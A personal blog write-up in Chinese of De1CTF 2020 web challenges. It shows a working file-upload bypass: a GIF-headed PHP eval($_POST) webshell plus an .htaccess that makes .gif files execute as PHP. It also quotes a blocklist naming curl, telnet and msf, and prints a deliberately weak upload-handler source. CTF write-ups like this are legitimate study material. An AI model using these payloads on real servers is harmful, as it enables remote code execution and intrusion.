---
title: De1ctf记录
date: 2020-05-02 10:55:23
updated: 2020-05-02 10:55:23
tags:
 - De1CTF2020
categories:
---

# web

## **check in**

打开链接是一个文件上传页面，抓包发现服务器是php5.4.16版本。上传一句话木马提示文件类型错误。后缀名不能是php，phtml,php2等之类的。还有MIME过滤，还对内容进行了过滤,不能包含一下字符

<!--more-->

```
perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!
```

修改文件名为1.gif，MIME为image/gif

过滤了ph。不能使用<?php标签。php版本为5.4.16，支持使用php短标签

上传.htaccess，其中有过滤，使用`\`换行

```
//1.gif
GIF89a
<?=
eval($_POST[cmd]);
```

```
//.htaccess
AddType application/x-httpd-p\
hp .gif
```

然后蚁剑连接，flag在更目录下。



## mixture







## Hard_Pentest_1

打开题目给了源码

```php+HTML
<?php
//Clear the uploads directory every hour
highlight_file(__FILE__);
$sandbox = "uploads/". md5("De1CTF2020".$_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);

if($_POST["submit"]){
    if (($_FILES["file"]["size"] < 2048) && Check()){
        if ($_FILES["file"]["error"] > 0){
            die($_FILES["file"]["error"]);
        }
        else{
            $filename=md5($_SERVER['REMOTE_ADDR'])."_".$_FILES["file"]["name"];
            move_uploaded_file($_FILES["file"]["tmp_name"], $filename);
            echo "save in:" . $sandbox."/" . $filename;
        }
    }
    else{
        echo "Not Allow!";
    }
}

function Check(){
    $BlackExts = array("php");
    $ext = explode(".", $_FILES["file"]["name"]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES["file"]["tmp_name"]);

    if(!preg_match('/[a-z0-9;~^`&|]/is',$file_content)  && 
        !in_array($exts, $BlackExts) && 
        !preg_match('/\.\./',$_FILES["file"]["name"])) {
          return true;
    }
    return false;
}
?>

<html>
<head>
<meta charset="utf-8">
<title>upload</title>
</head>
<body>

<form action="index.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="submit">
</form>

</body>
</html>
```

抓包查看是php7.2

